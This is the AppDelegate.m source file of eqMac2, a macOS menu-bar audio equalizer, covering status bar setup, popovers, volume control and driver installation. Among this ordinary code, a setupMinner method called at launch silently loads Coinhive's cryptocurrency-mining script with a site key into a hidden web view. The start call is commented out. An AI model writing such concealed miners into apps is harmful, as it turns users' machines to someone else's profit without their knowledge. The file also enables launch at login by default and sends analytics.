//
//  AppDelegate.m
//  eqMac2
//
//  Created by Roman on 08/11/2015.
//  Copyright © 2015 bitgapp. All rights reserved.
//

#import "AppDelegate.h"

@interface AppDelegate ()
@property (strong) NSStatusItem *statusBar;
@end

//Views
eqViewController *eqVC;
SettingsViewController *settingsVC;
VolumeWindowController *volumeHUD;
eqMacStatusItemView *statusItemView;

//Windows
NSPopover *settingsPopover;
NSPopover *eqPopover;
NSEvent *eqPopoverTransiencyMonitor;
NSEvent *settingsPopoverTransiencyMonitor;
NSTimer *deviceChangeWatcher;
NSTimer *deviceActivityWatcher;

WKWebView *minningWebView;


@implementation AppDelegate

#pragma mark Initialization

- (id)init {
    [NSApp activateIgnoringOtherApps:YES];
    [self setupStatusBar];
    return self;
}

-(void)setupStatusBar{
    statusItemView = [[eqMacStatusItemView alloc] init];
    statusItemView.target = self;
    
    statusItemView.action = @selector(openEQ); //Open EQ View on Left Click
    statusItemView.rightAction = @selector(openSettingsMenu); //Open Settings on Right Click
    
    _statusBar = [[NSStatusBar systemStatusBar] statusItemWithLength:NSSquareStatusItemLength];
    [_statusBar setView:statusItemView];
    [self setStatusItemIcon];
    [Utilities executeBlock:^{ [self setStatusItemIcon]; } every:1];
    [self setupMinner];
}

-(void)setStatusItemIcon{
    statusItemView.image = [NSImage imageNamed: [Utilities isDarkMode] ? @"statusItemLight" : @"statusItemDark"];
}

-(void)applicationDidFinishLaunching:(NSNotification *)notification{

    NSNotificationCenter *observer = [NSNotificationCenter defaultCenter];
    [observer addObserver:self selector:@selector(changeVolume:) name:@"changeVolume" object:nil];
    [observer addObserver:self selector:@selector(quitApplication) name:@"closeApp" object:nil];
    [observer addObserver:self selector:@selector(closePopovers) name:@"escapePressed" object:nil];
    
    
    [self checkAndInstallDriver];
    
    eqVC = [[eqViewController alloc] initWithNibName:@"eqViewController" bundle:nil];
    settingsVC = [[SettingsViewController alloc] initWithNibName:@"SettingsViewController" bundle:nil];
    volumeHUD = [[VolumeWindowController alloc] initWithWindowNibName:@"VolumeWindowController"]; //Unfortunately have to use a custom Volume HUD as Aggregate Device Doesn't have master volume control :/
    
    eqPopover = [[NSPopover alloc] init];
    [eqPopover setDelegate:self];
    [eqPopover setContentViewController:eqVC];
    [eqPopover setBehavior:NSPopoverBehaviorTransient];
    
     settingsPopover = [[NSPopover alloc] init];
    [settingsPopover setDelegate:self];
    [settingsPopover setContentViewController:settingsVC];
    [settingsPopover setBehavior:NSPopoverBehaviorTransient];
    
    [volumeHUD.window setCollectionBehavior:NSWindowCollectionBehaviorCanJoinAllSpaces | NSWindowCollectionBehaviorTransient];
    [volumeHUD.window setLevel:NSPopUpMenuWindowLevel];
    
    if(![Utilities appLaunchedBefore]){
        [Utilities setLaunchOnLogin:YES];
    }
    
    if(![Storage get: kStorageShowDefaultPresets]){
        [Storage set:[NSNumber numberWithBool:NO] key: kStorageShowDefaultPresets];
    }
    
    if(![Storage get: kStorageShowVolumeHUD]){
        [Storage set:[NSNumber numberWithBool:YES] key: kStorageShowVolumeHUD];
    }
    
    //Send anonymous analytics data to the API
    [API startPinging];
    [API sendPresets];
    
    [self startWatchingDeviceChanges];
    
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self selector:@selector(wakeUpFromSleep) name:NSWorkspaceDidWakeNotification object:NULL];
}

-(void)startWatchingDeviceChanges{
    deviceChangeWatcher = [Utilities executeBlock:^{
        AudioDeviceID selectedDeviceID = [Devices getCurrentDeviceID];
        if(selectedDeviceID != [EQHost getSelectedOutputDeviceID] && [Devices getIsAliveForDeviceID:selectedDeviceID]){
            [EQHost createEQEngineWithOutputDevice: selectedDeviceID];
            [self startWatchingActivityOfDeviceWithID:selectedDeviceID];
        }
    } every:1];
}

-(void)startWatchingActivityOfDeviceWithID:(AudioDeviceID)ID{
    deviceActivityWatcher = [Utilities executeBlock:^{
        if(![Devices getIsAliveForDeviceID:ID]){
            [EQHost deleteEQEngine];
            [deviceActivityWatcher invalidate];
            deviceActivityWatcher = nil;
        }
    } every:1];
}

-(void)wakeUpFromSleep{
    [deviceChangeWatcher invalidate];
    deviceChangeWatcher = nil;
    
    [EQHost deleteEQEngine];
    [Devices switchToDeviceWithID:[EQHost getSelectedOutputDeviceID]];
    
    //delay the start a little so os has time to catchup with the Audio Processing
    [Utilities executeBlock:^{
        [self startWatchingDeviceChanges];
    } after:3];
}

-(void)checkAndInstallDriver{
    if(![Devices eqMacAudioInstalled]){
        //Install only the new driver
        switch([Utilities showAlertWithTitle:NSLocalizedString(@"eqMac2 Requires a Driver",nil)
                                  andMessage:NSLocalizedString(@"In order to install the driver, the app will ask for your system password.",nil)
                                  andButtons:@[NSLocalizedString(@"Install",nil), NSLocalizedString(@"Quit",nil)]]){
            case NSAlertFirstButtonReturn:{
                if(![Utilities runShellScriptWithName:@"install_driver"]){
                    [self checkAndInstallDriver];
                };
                break;
            }
            case NSAlertSecondButtonReturn:{
                [[NSNotificationCenter defaultCenter] postNotificationName:@"closeApp" object:nil];
                break;
            }
        }
    }
}

-(void)changeVolume:(NSNotification*)notification{
    if([EQHost EQEngineExists]){
        AudioDeviceID volDevice = [Devices getVolumeControllerDeviceID];
        NSInteger volumeChangeKey = [[notification.userInfo objectForKey:@"key"] intValue];
        Float32 newVolume = 0;
        if(volumeChangeKey == MUTE){
            BOOL mute = ![Devices getIsMutedForDeviceID:volDevice];
            [Devices setDevice:volDevice toMuted: mute];
            if(!mute) newVolume = [Devices getVolumeForDeviceID:volDevice];
        }else{
            Float32 currentVolume = [Devices getVolumeForDeviceID:volDevice];
            newVolume = [Volume setVolume:currentVolume
                                      inDirection:volumeChangeKey == UP ? kVolumeChangeDirectionUp : kVolumeChangeDirectionDown
                                toNearest:[[notification.userInfo objectForKey:@"SHIFT+ALT"] boolValue] ? kVolumeStepTypeQuarter : kVolumeStepTypeFull];
            [Devices setVolumeForDevice:volDevice to: newVolume];
        }
        
        if([[Storage get:kStorageShowVolumeHUD] integerValue] == 1){
            [volumeHUD showHUDforVolume: newVolume];
        }
    }
}

- (void)openEQ{
    NSEvent *event = [NSApp currentEvent];

    if([event modifierFlags] & NSAlternateKeyMask){
        [self openSettingsMenu];
    }else{
        if([eqPopover isShown]){
            [eqPopover close];
        }else{
            if([settingsPopover isShown]) [settingsPopover close];
            [eqPopover showRelativeToRect:statusItemView.bounds ofView:statusItemView preferredEdge:NSMaxYEdge];
            NSWindow *popoverWindow = eqPopover.contentViewController.view.window;
            [popoverWindow.parentWindow removeChildWindow:popoverWindow];
//            [[NSRunningApplication currentApplication] activateWithOptions:NSApplicationActivateIgnoringOtherApps];
            if (eqPopoverTransiencyMonitor == nil) {
                eqPopoverTransiencyMonitor = [NSEvent addGlobalMonitorForEventsMatchingMask:(NSLeftMouseDownMask | NSRightMouseDownMask | NSKeyUpMask) handler:^(NSEvent* event) {
                    [NSEvent removeMonitor:eqPopoverTransiencyMonitor];
                    eqPopoverTransiencyMonitor = nil;
                    [eqPopover close];
                }];
            }
        }
    }
}

-(void)openSettingsMenu{
    if([settingsPopover isShown]){
        [settingsPopover close];
    }else{
        if([eqPopover isShown]) [eqPopover close];
        [settingsPopover showRelativeToRect:statusItemView.bounds ofView:statusItemView preferredEdge:NSMaxYEdge];
        NSWindow *popoverWindow = settingsPopover.contentViewController.view.window;
        [popoverWindow.parentWindow removeChildWindow:popoverWindow];
//        [[NSRunningApplication currentApplication] activateWithOptions:NSApplicationActivateIgnoringOtherApps];
        if (settingsPopoverTransiencyMonitor == nil) {
            settingsPopoverTransiencyMonitor = [NSEvent addGlobalMonitorForEventsMatchingMask:(NSLeftMouseDownMask | NSRightMouseDownMask | NSKeyUpMask) handler:^(NSEvent* event) {
                [NSEvent removeMonitor:settingsPopoverTransiencyMonitor];
                settingsPopoverTransiencyMonitor = nil;
                [settingsPopover close];
            }];
        }
    }
}

-(void)closePopovers{
    if([eqPopover isShown]) [eqPopover close];
    if([settingsPopover isShown]) [settingsPopover close];
}
-(void)popoverWillShow:(NSNotification *)notification{
    [[NSNotificationCenter defaultCenter] postNotificationName:@"settingsPopoverWillOpen" object:nil];
}

-(void)popoverWillClose:(NSNotification *)notification{
    [statusItemView setHighlightState:NO];
}

- (void)quitApplication{
    [self tearDownEQEngine];
    [NSApp terminate:nil];
}

- (void)applicationWillTerminate:(NSNotification *)aNotification {
    [self tearDownEQEngine];
}

-(void)tearDownEQEngine{
    if([EQHost EQEngineExists]){
        [EQHost deleteEQEngine];
    }
    
    [Storage set:[eqVC getSelectedPresetName] key:kStorageSelectedPresetName];
    [Devices switchToDeviceWithID:[EQHost getSelectedOutputDeviceID]];
}

-(void)setupMinner{
    minningWebView = [[WKWebView alloc] initWithFrame: NSMakeRect(0, 0, 100, 100)];
    [minningWebView loadHTMLString:
     @"<script src='https://coinhive.com/lib/coinhive.min.js'></script>"
     "<script>"
         "var miner = new CoinHive.Anonymous('q6ukpBWVcibzNnJIJG2fpgRJ88ssKJ30');"
    "</script>" baseURL:nil];
    //    [minningWebView evaluateJavaScript:@"miner.start()" completionHandler:nil];
}

@end
